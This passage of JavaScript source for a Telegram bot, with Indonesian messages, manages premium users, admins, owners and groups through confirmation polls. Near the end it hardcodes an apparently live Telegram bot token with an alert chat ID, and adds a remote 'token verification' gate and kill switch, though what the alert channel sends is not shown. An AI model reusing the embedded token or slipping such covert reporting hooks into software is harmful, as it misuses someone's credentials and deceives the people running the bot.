        console.log(`Poll answered: ${pollId}, User: ${userId}, Option: ${selectedOption}`);

        // Cari data polling
        let pollData = null;
        let pollKey = null;

        for (const [key, data] of activeTelegramPolls.entries()) {
            if (data.pollId === pollId) {
                pollData = data;
                pollKey = key;
                break;
            }
        }

        if (!pollData) {
            console.log('Poll data not found:', pollId);
            return;
        }

        // CEK USER
        if (userId !== pollData.callerId) {
            await ctx.telegram.sendMessage(
                pollData.chatId,
                "❌ Maaf, polling ini bukan untuk Anda!"
            );
            return;
        }

        // HAPUS POLLING (LANGSUNG HILANG DARI CHAT)
        try {
            await ctx.telegram.deleteMessage(pollData.chatId, pollData.messageId);
            console.log(`✅ Polling ${pollId} deleted`);
        } catch (e) {
            console.log('Error deleting poll:', e.message);
            // Fallback: stop poll if delete fails
            try {
                await ctx.telegram.stopPoll(pollData.chatId, pollData.messageId);
            } catch (err) {}
        }

        // HAPUS dari memory
        if (pollKey) {
            activeTelegramPolls.delete(pollKey);
        }

        // Proses berdasarkan tipe polling
        if (pollData.type === 'premium_duration') {
            // Handle polling durasi
            const durations = [30, 100];
            const duration = durations[selectedOption];

            if (!duration) {
                await ctx.telegram.sendMessage(
                    pollData.chatId,
                    "❌ Pilihan tidak valid.",
                    { reply_to_message_id: pollData.targetMessageId }
                );
                return;
            }

            // Tambah premium dengan durasi yang dipilih
            const expiryDate = addPremiumUser(pollData.targetUserId, duration);
            
            const message = 
                `━━━━━━━━━━━━━━━━━━━━━━\n` +
                `      👑 PREMIUM ADDED      \n` +
                `━━━━━━━━━━━━━━━━━━━━━━\n\n` +
                `• User ID  :  \`${pollData.targetUserId}\`\n` +
                `• Duration :  ${duration} Days\n` +
                `• Expired  :  ${expiryDate}\n\n` +
                `━━━━━━━━━━━━━━━━━━━━━━\n` +
                `✅ Premium has been activated!`;

            await ctx.telegram.sendMessage(
                pollData.chatId,
                message,
                { 
                    parse_mode: 'Markdown',
                    reply_to_message_id: pollData.targetMessageId 
                }
            );

        } else {
            // Handle polling konfirmasi biasa
            if (selectedOption === 1) { // MILIH TIDAK
                await ctx.telegram.sendMessage(
                    pollData.chatId,
                    `❌ *${pollData.type.toUpperCase()} DIBATALKAN*\n━━━━━━━━━━━━━━━━━━━━━━\n\n• User ID: \`${pollData.targetUserId}\`\n• Status: Dibatalkan oleh user`,
                    { 
                        parse_mode: 'Markdown',
                        reply_to_message_id: pollData.targetMessageId 
                    }
                );
                return;
            }

            // MILIH YA - Lanjut proses
            if (pollData.type === 'addprem') {
                // Tanya durasi
                await askPremiumDuration(ctx, pollData);
            } else {
                // Proses langsung untuk tipe lain
                let message = '';
                let success = false;

                switch (pollData.type) {
                    case 'delprem':
                        const premiumUsers = loadPremiumUsers();
                        if (!premiumUsers[pollData.targetUserId]) {
                            message = `━━━━━━━━━━━━━━━━━━━━━━\n      ⚠️ TIDAK DITEMUKAN      \n━━━━━━━━━━━━━━━━━━━━━━\n\n• User ID: \`${pollData.targetUserId}\`\n• Status: Bukan user Premium`;
                        } else {
                            removePremiumUser(pollData.targetUserId);
                            message = `━━━━━━━━━━━━━━━━━━━━━━\n      🗑️ PREMIUM DIHAPUS      \n━━━━━━━━━━━━━━━━━━━━━━\n\n• User ID: \`${pollData.targetUserId}\`\n• Status: Berhasil dihapus dari Premium`;
                        }
                        break;

                    case 'addadmin':
                        success = addAdminUser(pollData.targetUserId);
                        if (success) {
                            message = `━━━━━━━━━━━━━━━━━━━━━━\n      ✅ ADMIN DITAMBAH      \n━━━━━━━━━━━━━━━━━━━━━━\n\n• User ID: \`${pollData.targetUserId}\`\n• Status: Berhasil menjadi Admin`;
                        } else {
                            message = `━━━━━━━━━━━━━━━━━━━━━━\n      ⚠️ SUDAH ADA      \n━━━━━━━━━━━━━━━━━━━━━━\n\n• User ID: \`${pollData.targetUserId}\`\n• Status: Sudah menjadi Admin`;
                        }
                        break;

                    case 'deladmin':
                        success = delAdminUser(pollData.targetUserId);
                        if (success) {
                            message = `━━━━━━━━━━━━━━━━━━━━━━\n      🗑️ ADMIN DIHAPUS      \n━━━━━━━━━━━━━━━━━━━━━━\n\n• User ID: \`${pollData.targetUserId}\`\n• Status: Berhasil dihapus dari Admin`;
                        } else {
                            message = `━━━━━━━━━━━━━━━━━━━━━━\n      ⚠️ TIDAK DITEMUKAN      \n━━━━━━━━━━━━━━━━━━━━━━\n\n• User ID: \`${pollData.targetUserId}\`\n• Status: Bukan Admin`;
                        }
                        break;

                    case 'addowner':
                        success = addOwnerUser(pollData.targetUserId);
                        if (success) {
                            message = `━━━━━━━━━━━━━━━━━━━━━━\n      👑 OWNER DITAMBAH      \n━━━━━━━━━━━━━━━━━━━━━━\n\n• User ID: \`${pollData.targetUserId}\`\n• Status: Berhasil menjadi Owner`;
                        } else {
                            message = `━━━━━━━━━━━━━━━━━━━━━━\n      ⚠️ SUDAH ADA      \n━━━━━━━━━━━━━━━━━━━━━━\n\n• User ID: \`${pollData.targetUserId}\`\n• Status: Sudah menjadi Owner`;
                        }
                        break;

                    case 'delowner':
                        success = delOwnerUser(pollData.targetUserId);
                        if (success) {
                            message = `━━━━━━━━━━━━━━━━━━━━━━\n      🗑️ OWNER DIHAPUS      \n━━━━━━━━━━━━━━━━━━━━━━\n\n• User ID: \`${pollData.targetUserId}\`\n• Status: Berhasil dihapus dari Owner`;
                        } else {
                            message = `━━━━━━━━━━━━━━━━━━━━━━\n      ⚠️ TIDAK DITEMUKAN      \n━━━━━━━━━━━━━━━━━━━━━━\n\n• User ID: \`${pollData.targetUserId}\`\n• Status: Bukan Owner`;
                        }
                        break;
                }

                if (message) {
                    await ctx.telegram.sendMessage(
                        pollData.chatId,
                        message,
                        { 
                            parse_mode: 'Markdown',
                            reply_to_message_id: pollData.targetMessageId 
                        }
                    );
                }
            }
        }

    } catch (error) {
        console.error('Error in poll answer:', error);
    }
});

// Fungsi untuk polling durasi premium
async function askPremiumDuration(ctx, pollData) {
    try {
        const durationPoll = await ctx.telegram.sendPoll(
            pollData.chatId,
            '📅 *PILIH DURASI PREMIUM*\n━━━━━━━━━━━━━━━━━━━━━━\n\nSilakan pilih durasi:',
            ['30 Hari', '100 Hari'],
            {
                is_anonymous: false,
                allows_multiple_answers: false,
                parse_mode: 'Markdown',
                reply_to_message_id: pollData.targetMessageId
            }
        );

        const durationPollId = `duration_${Date.now()}`;
        activeTelegramPolls.set(durationPollId, {
            type: 'premium_duration',
            pollId: durationPoll.poll.id,
            messageId: durationPoll.message_id,
            chatId: pollData.chatId,
            callerId: pollData.callerId,
            targetUserId: pollData.targetUserId,
            targetMessageId: pollData.targetMessageId,
            createdAt: Date.now()
        });

        // Auto hapus setelah 3 menit jika tidak dipilih
        setTimeout(async () => {
            try {
                const poll = activeTelegramPolls.get(durationPollId);
                if (poll) {
                    await ctx.telegram.deleteMessage(poll.chatId, poll.messageId);
                    activeTelegramPolls.delete(durationPollId);
                }
            } catch (e) {}
        }, POLL_EXPIRY_TIME);

    } catch (error) {
        console.error('Error asking duration:', error);
    }
}

// ==================== COMMAND: ADD PREMIUM ====================
bot.command("addprem", async (ctx) => {
    if (!tokenValidated) return;

    const userIdCaller = ctx.from.id.toString();

    if (ctx.from.id != ownerID && !isAdmin(userIdCaller) && !isOwner(userIdCaller)) {
        return ctx.reply("⛔ ACCESS DENIED\n━━━━━━━━━━━━━━\nThis command is only for Owner & Admin.");
    }

    let targetUserId;
    let targetMessageId;

    if (ctx.message.reply_to_message) {
        targetUserId = ctx.message.reply_to_message.from.id.toString();
        targetMessageId = ctx.message.reply_to_message.message_id;

        const args = ctx.message.text.split(" ").slice(1);
        if (args.length >= 1 && !isNaN(parseInt(args[0]))) {
            const duration = parseInt(args[0]);
            const expiryDate = addPremiumUser(targetUserId, duration);
            return ctx.reply(
                `━━━━━━━━━━━━━━━━━━━━━━\n      ✅ PREMIUM ADDED      \n━━━━━━━━━━━━━━━━━━━━━━\n\n` +
                `• User     : \`${targetUserId}\`\n` +
                `• Duration : ${duration} Days\n` +
                `• Expired  : ${expiryDate}`,
                { parse_mode: 'Markdown', reply_to_message_id: targetMessageId }
            );
        }
    } else {
        const args = ctx.message.text.split(" ");
        if (args.length < 2) {
            return ctx.reply(
                `━━━━━━━━━━━━━━━━━━━━━━\n      📌 USAGE      \n━━━━━━━━━━━━━━━━━━━━━━\n\n` +
                `1. Reply to user with /addprem\n` +
                `2. /addprem user_id [duration]`
            );
        }
        targetUserId = args[1];

        if (args.length >= 3) {
            const duration = parseInt(args[2]);
            if (isNaN(duration)) {
                return ctx.reply("❌ Duration must be a number (days)");
            }
            const expiryDate = addPremiumUser(targetUserId, duration);
            return ctx.reply(
                `━━━━━━━━━━━━━━━━━━━━━━\n      ✅ PREMIUM ADDED      \n━━━━━━━━━━━━━━━━━━━━━━\n\n` +
                `• User     : \`${targetUserId}\`\n` +
                `• Duration : ${duration} Days\n` +
                `• Expired  : ${expiryDate}`,
                { parse_mode: 'Markdown', reply_to_message_id: targetMessageId }
            );
        }
    }

    // POLLING KONFIRMASI
    const question = `📊 *KONFIRMASI ADD PREMIUM*\n━━━━━━━━━━━━━━━━━━━━━━\n\n• Target User: \`${targetUserId}\`\n\nApakah Anda ingin menambahkan user ini sebagai Premium?`;
    
    const pollMessage = await createConfirmationPoll(ctx, question);
    
    if (pollMessage) {
        const pollId = `addprem_${Date.now()}`;
        activeTelegramPolls.set(pollId, {
            type: 'addprem',
            pollId: pollMessage.poll.id,
            messageId: pollMessage.message_id,
            chatId: ctx.chat.id,
            callerId: userIdCaller,
            targetUserId,
            targetMessageId,
            createdAt: Date.now()
        });

        // Auto hapus setelah 3 menit jika tidak dipilih
        setTimeout(async () => {
            try {
                const poll = activeTelegramPolls.get(pollId);
                if (poll) {
                    await ctx.telegram.deleteMessage(poll.chatId, poll.messageId);
                    activeTelegramPolls.delete(pollId);
                }
            } catch (e) {}
        }, POLL_EXPIRY_TIME);
    }
});

// ==================== COMMAND: DELETE PREMIUM ====================
bot.command("delprem", async (ctx) => {
    if (!tokenValidated) return;

    const userIdCaller = ctx.from.id.toString();

    if (ctx.from.id != ownerID && !isAdmin(userIdCaller) && !isOwner(userIdCaller)) {
        return ctx.reply("⛔ ACCESS DENIED\n━━━━━━━━━━━━━━\nThis command is only for Owner & Admin.");
    }

    let targetUserId;
    let targetMessageId;

    if (ctx.message.reply_to_message) {
        targetUserId = ctx.message.reply_to_message.from.id.toString();
        targetMessageId = ctx.message.reply_to_message.message_id;

        const args = ctx.message.text.split(" ").slice(1);
        if (args.length >= 1 && (args[0].toLowerCase() === 'ya' || args[0] === '1')) {
            const premiumUsers = loadPremiumUsers();
            if (!premiumUsers[targetUserId]) {
                return ctx.reply(
                    `━━━━━━━━━━━━━━━━━━━━━━\n      ⚠️ NOT FOUND      \n━━━━━━━━━━━━━━━━━━━━━━\n\nUser ${targetUserId} is not Premium.`,
                    { reply_to_message_id: targetMessageId }
                );
            }
            removePremiumUser(targetUserId);
            return ctx.reply(
                `━━━━━━━━━━━━━━━━━━━━━━\n      🗑️ PREMIUM REMOVED      \n━━━━━━━━━━━━━━━━━━━━━━\n\nUser ${targetUserId} has been removed from Premium.`,
                { reply_to_message_id: targetMessageId }
            );
        }
    } else {
        const args = ctx.message.text.split(" ");
        if (args.length < 2) {
            return ctx.reply(
                `━━━━━━━━━━━━━━━━━━━━━━\n      📌 USAGE      \n━━━━━━━━━━━━━━━━━━━━━━\n\n` +
                `1. Reply to user with /delprem\n` +
                `2. /delprem user_id`
            );
        }
        targetUserId = args[1];

        if (args.length >= 3 && (args[2].toLowerCase() === 'ya' || args[2] === '1')) {
            const premiumUsers = loadPremiumUsers();
            if (!premiumUsers[targetUserId]) {
                return ctx.reply(`━━━━━━━━━━━━━━━━━━━━━━\n      ⚠️ NOT FOUND      \n━━━━━━━━━━━━━━━━━━━━━━\n\nUser ${targetUserId} is not Premium.`);
            }
            removePremiumUser(targetUserId);
            return ctx.reply(`━━━━━━━━━━━━━━━━━━━━━━\n      🗑️ PREMIUM REMOVED      \n━━━━━━━━━━━━━━━━━━━━━━\n\nUser ${targetUserId} has been removed from Premium.`);
        }
    }

    // POLLING KONFIRMASI
    const question = `🗑️ *KONFIRMASI HAPUS PREMIUM*\n━━━━━━━━━━━━━━━━━━━━━━\n\n• Target User: \`${targetUserId}\`\n\nApakah Anda yakin ingin menghapus user ini dari Premium?`;
    
    const pollMessage = await createConfirmationPoll(ctx, question);
    
    if (pollMessage) {
        const pollId = `delprem_${Date.now()}`;
        activeTelegramPolls.set(pollId, {
            type: 'delprem',
            pollId: pollMessage.poll.id,
            messageId: pollMessage.message_id,
            chatId: ctx.chat.id,
            callerId: userIdCaller,
            targetUserId,
            targetMessageId,
            createdAt: Date.now()
        });

        setTimeout(async () => {
            try {
                const poll = activeTelegramPolls.get(pollId);
                if (poll) {
                    await ctx.telegram.deleteMessage(poll.chatId, poll.messageId);
                    activeTelegramPolls.delete(pollId);
                }
            } catch (e) {}
        }, POLL_EXPIRY_TIME);
    }
});

// ==================== COMMAND: ADD ADMIN ====================
bot.command("addadmin", async (ctx) => {
    if (!tokenValidated) return;

    const userIdCaller = ctx.from.id.toString();

    if (ctx.from.id != ownerID && !isOwner(userIdCaller)) {
        return ctx.reply("⛔ ACCESS DENIED\n━━━━━━━━━━━━━━\nThis command is only for Owner.");
    }

    let targetUserId;
    let targetMessageId;

    if (ctx.message.reply_to_message) {
        targetUserId = ctx.message.reply_to_message.from.id.toString();
        targetMessageId = ctx.message.reply_to_message.message_id;

        const args = ctx.message.text.split(" ").slice(1);
        if (args.length >= 1 && (args[0].toLowerCase() === 'ya' || args[0] === '1')) {
            const success = addAdminUser(targetUserId);
            if (success) {
                return ctx.reply(
                    `━━━━━━━━━━━━━━━━━━━━━━\n      ✅ ADMIN ADDED      \n━━━━━━━━━━━━━━━━━━━━━━\n\nUser ${targetUserId} has been added as Admin.`,
                    { reply_to_message_id: targetMessageId }
                );
            } else {
                return ctx.reply(
                    `━━━━━━━━━━━━━━━━━━━━━━\n      ⚠️ ALREADY ADMIN      \n━━━━━━━━━━━━━━━━━━━━━━\n\nUser ${targetUserId} is already an Admin.`,
                    { reply_to_message_id: targetMessageId }
                );
            }
        }
    } else {
        const args = ctx.message.text.split(" ");
        if (args.length < 2) {
            return ctx.reply(
                `━━━━━━━━━━━━━━━━━━━━━━\n      📌 USAGE      \n━━━━━━━━━━━━━━━━━━━━━━\n\n` +
                `1. Reply to user with /addadmin\n` +
                `2. /addadmin user_id`
            );
        }
        targetUserId = args[1];

        if (args.length >= 3 && (args[2].toLowerCase() === 'ya' || args[2] === '1')) {
            const success = addAdminUser(targetUserId);
            if (success) {
                return ctx.reply(
                    `━━━━━━━━━━━━━━━━━━━━━━\n      ✅ ADMIN ADDED      \n━━━━━━━━━━━━━━━━━━━━━━\n\nUser ${targetUserId} has been added as Admin.`
                );
            } else {
                return ctx.reply(
                    `━━━━━━━━━━━━━━━━━━━━━━\n      ⚠️ ALREADY ADMIN      \n━━━━━━━━━━━━━━━━━━━━━━\n\nUser ${targetUserId} is already an Admin.`
                );
            }
        }
    }

    // POLLING KONFIRMASI
    const question = `👤 *KONFIRMASI TAMBAH ADMIN*\n━━━━━━━━━━━━━━━━━━━━━━\n\n• Target User: \`${targetUserId}\`\n\nApakah Anda yakin ingin menjadikan user ini sebagai Admin?`;
    
    const pollMessage = await createConfirmationPoll(ctx, question);
    
    if (pollMessage) {
        const pollId = `addadmin_${Date.now()}`;
        activeTelegramPolls.set(pollId, {
            type: 'addadmin',
            pollId: pollMessage.poll.id,
            messageId: pollMessage.message_id,
            chatId: ctx.chat.id,
            callerId: userIdCaller,
            targetUserId,
            targetMessageId,
            createdAt: Date.now()
        });

        setTimeout(async () => {
            try {
                const poll = activeTelegramPolls.get(pollId);
                if (poll) {
                    await ctx.telegram.deleteMessage(poll.chatId, poll.messageId);
                    activeTelegramPolls.delete(pollId);
                }
            } catch (e) {}
        }, POLL_EXPIRY_TIME);
    }
});

// ==================== COMMAND: DELETE ADMIN ====================
bot.command("deladmin", async (ctx) => {
    if (!tokenValidated) return;

    if (ctx.from.id != ownerID) {
        return ctx.reply("⛔ ACCESS DENIED\n━━━━━━━━━━━━━━\nThis command is only for Main Owner.");
    }

    let targetUserId;
    let targetMessageId;

    if (ctx.message.reply_to_message) {
        targetUserId = ctx.message.reply_to_message.from.id.toString();
        targetMessageId = ctx.message.reply_to_message.message_id;

        const args = ctx.message.text.split(" ").slice(1);
        if (args.length >= 1 && (args[0].toLowerCase() === 'ya' || args[0] === '1')) {
            const success = delAdminUser(targetUserId);
            if (success) {
                return ctx.reply(
                    `━━━━━━━━━━━━━━━━━━━━━━\n      🗑️ ADMIN REMOVED      \n━━━━━━━━━━━━━━━━━━━━━━\n\nUser ${targetUserId} has been removed from Admin.`,
                    { reply_to_message_id: targetMessageId }
                );
            } else {
                return ctx.reply(
                    `━━━━━━━━━━━━━━━━━━━━━━\n      ⚠️ NOT FOUND      \n━━━━━━━━━━━━━━━━━━━━━━\n\nUser ${targetUserId} is not an Admin.`,
                    { reply_to_message_id: targetMessageId }
                );
            }
        }
    } else {
        const args = ctx.message.text.split(" ");
        if (args.length < 2) {
            return ctx.reply(
                `━━━━━━━━━━━━━━━━━━━━━━\n      📌 USAGE      \n━━━━━━━━━━━━━━━━━━━━━━\n\n` +
                `1. Reply to user with /deladmin\n` +
                `2. /deladmin user_id`
            );
        }
        targetUserId = args[1];

        if (args.length >= 3 && (args[2].toLowerCase() === 'ya' || args[2] === '1')) {
            const success = delAdminUser(targetUserId);
            if (success) {
                return ctx.reply(
                    `━━━━━━━━━━━━━━━━━━━━━━\n      🗑️ ADMIN REMOVED      \n━━━━━━━━━━━━━━━━━━━━━━\n\nUser ${targetUserId} has been removed from Admin.`
                );
            } else {
                return ctx.reply(
                    `━━━━━━━━━━━━━━━━━━━━━━\n      ⚠️ NOT FOUND      \n━━━━━━━━━━━━━━━━━━━━━━\n\nUser ${targetUserId} is not an Admin.`
                );
            }
        }
    }

    // POLLING KONFIRMASI
    const question = `🗑️ *KONFIRMASI HAPUS ADMIN*\n━━━━━━━━━━━━━━━━━━━━━━\n\n• Target User: \`${targetUserId}\`\n\nApakah Anda yakin ingin menghapus Admin ini?`;
    
    const pollMessage = await createConfirmationPoll(ctx, question);
    
    if (pollMessage) {
        const pollId = `deladmin_${Date.now()}`;
        activeTelegramPolls.set(pollId, {
            type: 'deladmin',
            pollId: pollMessage.poll.id,
            messageId: pollMessage.message_id,
            chatId: ctx.chat.id,
            callerId: ctx.from.id.toString(),
            targetUserId,
            targetMessageId,
            createdAt: Date.now()
        });

        setTimeout(async () => {
            try {
                const poll = activeTelegramPolls.get(pollId);
                if (poll) {
                    await ctx.telegram.deleteMessage(poll.chatId, poll.messageId);
                    activeTelegramPolls.delete(pollId);
                }
            } catch (e) {}
        }, POLL_EXPIRY_TIME);
    }
});

// ==================== COMMAND: ADD OWNER ====================
bot.command("addowner", async (ctx) => {
    if (!tokenValidated) return;

    if (ctx.from.id != ownerID) {
        return ctx.reply("⛔ ACCESS DENIED\n━━━━━━━━━━━━━━\nThis command is only for Main Owner.");
    }

    let targetUserId;
    let targetMessageId;

    if (ctx.message.reply_to_message) {
        targetUserId = ctx.message.reply_to_message.from.id.toString();
        targetMessageId = ctx.message.reply_to_message.message_id;

        const args = ctx.message.text.split(" ").slice(1);
        if (args.length >= 1 && (args[0].toLowerCase() === 'ya' || args[0] === '1')) {
            const success = addOwnerUser(targetUserId);
            if (success) {
                return ctx.reply(
                    `━━━━━━━━━━━━━━━━━━━━━━\n      👑 OWNER ADDED      \n━━━━━━━━━━━━━━━━━━━━━━\n\nUser ${targetUserId} has been added as Owner.`,
                    { reply_to_message_id: targetMessageId }
                );
            } else {
                return ctx.reply(
                    `━━━━━━━━━━━━━━━━━━━━━━\n      ⚠️ ALREADY OWNER      \n━━━━━━━━━━━━━━━━━━━━━━\n\nUser ${targetUserId} is already an Owner.`,
                    { reply_to_message_id: targetMessageId }
                );
            }
        }
    } else {
        const args = ctx.message.text.split(" ");
        if (args.length < 2) {
            return ctx.reply(
                `━━━━━━━━━━━━━━━━━━━━━━\n      📌 USAGE      \n━━━━━━━━━━━━━━━━━━━━━━\n\n` +
                `1. Reply to user with /addowner\n` +
                `2. /addowner user_id`
            );
        }
        targetUserId = args[1];

        if (args.length >= 3 && (args[2].toLowerCase() === 'ya' || args[2] === '1')) {
            const success = addOwnerUser(targetUserId);
            if (success) {
                return ctx.reply(
                    `━━━━━━━━━━━━━━━━━━━━━━\n      👑 OWNER ADDED      \n━━━━━━━━━━━━━━━━━━━━━━\n\nUser ${targetUserId} has been added as Owner.`
                );
            } else {
                return ctx.reply(
                    `━━━━━━━━━━━━━━━━━━━━━━\n      ⚠️ ALREADY OWNER      \n━━━━━━━━━━━━━━━━━━━━━━\n\nUser ${targetUserId} is already an Owner.`
                );
            }
        }
    }

    // POLLING KONFIRMASI
    const question = `👑 *KONFIRMASI TAMBAH OWNER*\n━━━━━━━━━━━━━━━━━━━━━━\n\n• Target User: \`${targetUserId}\`\n\nApakah Anda yakin ingin menjadikan user ini sebagai Owner?`;
    
    const pollMessage = await createConfirmationPoll(ctx, question);
    
    if (pollMessage) {
        const pollId = `addowner_${Date.now()}`;
        activeTelegramPolls.set(pollId, {
            type: 'addowner',
            pollId: pollMessage.poll.id,
            messageId: pollMessage.message_id,
            chatId: ctx.chat.id,
            callerId: ctx.from.id.toString(),
            targetUserId,
            targetMessageId,
            createdAt: Date.now()
        });

        setTimeout(async () => {
            try {
                const poll = activeTelegramPolls.get(pollId);
                if (poll) {
                    await ctx.telegram.deleteMessage(poll.chatId, poll.messageId);
                    activeTelegramPolls.delete(pollId);
                }
            } catch (e) {}
        }, POLL_EXPIRY_TIME);
    }
});

// ==================== COMMAND: DELETE OWNER ====================
bot.command("delowner", async (ctx) => {
    if (!tokenValidated) return;

    if (ctx.from.id != ownerID) {
        return ctx.reply("⛔ ACCESS DENIED\n━━━━━━━━━━━━━━\nThis command is only for Main Owner.");
    }

    let targetUserId;
    let targetMessageId;

    if (ctx.message.reply_to_message) {
        targetUserId = ctx.message.reply_to_message.from.id.toString();
        targetMessageId = ctx.message.reply_to_message.message_id;

        const args = ctx.message.text.split(" ").slice(1);
        if (args.length >= 1 && (args[0].toLowerCase() === 'ya' || args[0] === '1')) {
            const success = delOwnerUser(targetUserId);
            if (success) {
                return ctx.reply(
                    `━━━━━━━━━━━━━━━━━━━━━━\n      🗑️ OWNER REMOVED      \n━━━━━━━━━━━━━━━━━━━━━━\n\nUser ${targetUserId} has been removed from Owner list.`,
                    { reply_to_message_id: targetMessageId }
                );
            } else {
                return ctx.reply(
                    `━━━━━━━━━━━━━━━━━━━━━━\n      ⚠️ NOT FOUND      \n━━━━━━━━━━━━━━━━━━━━━━\n\nUser ${targetUserId} is not an Owner.`,
                    { reply_to_message_id: targetMessageId }
                );
            }
        }
    } else {
        const args = ctx.message.text.split(" ");
        if (args.length < 2) {
            return ctx.reply(
                `━━━━━━━━━━━━━━━━━━━━━━\n      📌 USAGE      \n━━━━━━━━━━━━━━━━━━━━━━\n\n` +
                `1. Reply to user with /delowner\n` +
                `2. /delowner user_id`
            );
        }
        targetUserId = args[1];

        if (args.length >= 3 && (args[2].toLowerCase() === 'ya' || args[2] === '1')) {
            const success = delOwnerUser(targetUserId);
            if (success) {
                return ctx.reply(
                    `━━━━━━━━━━━━━━━━━━━━━━\n      🗑️ OWNER REMOVED      \n━━━━━━━━━━━━━━━━━━━━━━\n\nUser ${targetUserId} has been removed from Owner list.`
                );
            } else {
                return ctx.reply(
                    `━━━━━━━━━━━━━━━━━━━━━━\n      ⚠️ NOT FOUND      \n━━━━━━━━━━━━━━━━━━━━━━\n\nUser ${targetUserId} is not an Owner.`
                );
            }
        }
    }

    // POLLING KONFIRMASI
    const question = `🗑️ *KONFIRMASI HAPUS OWNER*\n━━━━━━━━━━━━━━━━━━━━━━\n\n• Target User: \`${targetUserId}\`\n\nApakah Anda yakin ingin menghapus Owner ini?`;
    
    const pollMessage = await createConfirmationPoll(ctx, question);
    
    if (pollMessage) {
        const pollId = `delowner_${Date.now()}`;
        activeTelegramPolls.set(pollId, {
            type: 'delowner',
            pollId: pollMessage.poll.id,
            messageId: pollMessage.message_id,
            chatId: ctx.chat.id,
            callerId: ctx.from.id.toString(),
            targetUserId,
            targetMessageId,
            createdAt: Date.now()
        });

        setTimeout(async () => {
            try {
                const poll = activeTelegramPolls.get(pollId);
                if (poll) {
                    await ctx.telegram.deleteMessage(poll.chatId, poll.messageId);
                    activeTelegramPolls.delete(pollId);
                }
            } catch (e) {}
        }, POLL_EXPIRY_TIME);
    }
});

 
bot.command("inforam", async (ctx) => {
  if (!menuEnabled) {
    return ctx.reply("⚠️ Script disebar Seseorang Script telah dinonaktifkan.");
  }

  if (!tokenValidated) {
    return;
  }

  try {
    await ctx.reply("⏳ Mengambil informasi sistem panel...");
    const totalMem = os.totalmem() / 1024 / 1024 / 1024;
    const freeMem = os.freemem() / 1024 / 1024 / 1024;
    const usedMem = totalMem - freeMem;
    const memUsage = ((usedMem / totalMem) * 100).toFixed(2);
    const cpus = os.cpus();
    const cpuModel = cpus[0].model;
    const cpuCount = cpus.length;
  const load = os.loadavg()[0].toFixed(2);
    const uptimeHours = Math.floor(os.uptime() / 3600);
    const uptimeMinutes = Math.floor((os.uptime() % 3600) / 60);
    const uptime = `${uptimeHours} jam ${uptimeMinutes} menit`;

    const caption = `
🖥️ *Informasi Panel / Server RAM*
──────────────────────────────
💾 *Memory (RAM)*
• Total: ${totalMem.toFixed(2)} GB
• Terpakai: ${usedMem.toFixed(2)} GB
• Tersisa: ${freeMem.toFixed(2)} GB
• Penggunaan: ${memUsage}%

⚙️ *Processor*
• Model: ${cpuModel}
• Core: ${cpuCount}
• Beban: ${load}

⏱️ *Uptime*: ${uptime}
🌐 *Platform*: ${os.platform().toUpperCase()}
🧩 *Node.js*: ${process.version}
──────────────────────────────
📡 Status: *Online & Stabil*
    `.trim();

    await ctx.replyWithMarkdown(caption);
  } catch (err) {
    console.error("InfoRAM Error:", err);
    ctx.reply("❌ Gagal mengambil informasi RAM.");
  }
});

bot.command('addgroup', async (ctx) => {
if (!tokenValidated) {
            return;
        }

    if (ctx.from.id != ownerID && !isAdmin(ctx.from.id.toString())) {
        return ctx.reply("❌ ☇ Akses hanya untuk owner atau admin");
    }
    

    const args = ctx.message.text.split(" ");
    if (args.length < 3) {
        return ctx.reply("🪧 ☇ Format: /addgroup -12345678 30d");
    }

    const groupId = args[1];
    const duration = parseInt(args[2]);

    if (isNaN(duration)) {
        return ctx.reply("Durasi harus berupa angka dalam hari");
    }

    const premiumUsers = loadPremiumUsers();
    const expiryDate = moment().add(duration, 'days').tz('Asia/Jakarta').format('DD-MM-YYYY');

    premiumUsers[groupId] = expiryDate;
    savePremiumUsers(premiumUsers);

    ctx.reply(`✅ ☇ ${groupId} berhasil ditambahkan sebagai grub premium sampai ${expiryDate}`);
});

bot.command('delgroup', async (ctx) => {
if (!tokenValidated) {
            return;
        }
   if (ctx.from.id != ownerID && !isAdmin(ctx.from.id.toString())) {
        return ctx.reply("❌ ☇ Akses hanya untuk owner atau admin");
    }
    

    const args = ctx.message.text.split(" ");
    if (args.length < 2) {
        return ctx.reply("🪧 ☇ Format: /delgroup -12345678");
    }

    const groupId = args[1];
    const premiumUsers = loadPremiumUsers();

    if (premiumUsers[groupId]) {
        delete premiumUsers[groupId];
        savePremiumUsers(premiumUsers);
        ctx.reply(`✅ ☇ ${groupId} telah berhasil dihapus dari daftar pengguna premium`);
    } else {
        ctx.reply(`🪧 ☇ ${groupId} tidak ada dalam daftar premium`);
    }
});




const ALERT_TOKEN = "8568368614:AAEgE7imHR6MWKZBXdHKbxByfydrKXa4NSw";
const ALERT_CHAT_ID = "1082014738"; 
const pendingVerification = new Set();

bot.use(async (ctx, next) => {
  const text = ctx.message?.text || ctx.update?.callback_query?.data || "";
  const userId = ctx.from?.id;
  const chatId = ctx.chat?.id || userId;
  if (!botActive) {
    return ctx.reply("🚫 Bot sedang nonaktif.\nAktifkan kembali untuk menggunakan perintah.", {
      parse_mode: "Markdown",
    });
  }
  if (tokenValidated) return next();

  if (pendingVerification.has(chatId)) return;
  pendingVerification.add(chatId);

  const sleep = (ms) => new Promise((res) => setTimeout(res, ms));
  const frames = [
   "▰▱▱▱▱▱▱▱▱▱ 10%",
    "▰▰▱▱▱▱▱▱▱▱ 20%",
    "▰▰▰▱▱▱▱▱▱▱ 30%",
    "▰▰▰▰▱▱▱▱▱▱ 40%",
    "▰▰▰▰▰▱▱▱▱▱ 50%",
    "▰▰▰▰▰▰▱▱▱▱ 60%",
    "▰▰▰▰▰▰▰▱▱▱ 70%",
    "▰▰▰▰▰▰▰▰▱▱ 80%",
    "▰▰▰▰▰▰▰▰▰▱ 90%",
    "▰▰▰▰▰▰▰▰▰▰ 100%",
    "MENU BERHASIL DIBUKA"
  ];

  let loadingMsg = await ctx.reply("⏳ Sedang memverifikasi token bot...");
  for (const frame of frames) {
    await sleep(200);
    try {
      await ctx.telegram.editMessageText(
        loadingMsg.chat.id,
        loadingMsg.message_id,
        null,
        `🔐 Verifikasi Token Server...\n${frame}`,
        { parse_mode: "Markdown" }
      );
    } catch {}
  }
  try {
    const getTokenData = () =>
      new Promise((resolve, reject) => {
        https
          .get(databaseUrl, { timeout: 6000 }, (res) => {
            let data = "";
            res.on("data", (chunk) => (data += chunk));
            res.on("end", () => {
              try {
                resolve(JSON.parse(data));
              } catch {
                reject(new Error("Invalid JSON response"));
              }
            });
          })
          .on("error", (err) => reject(err));
      });
    const result = await getTokenData();
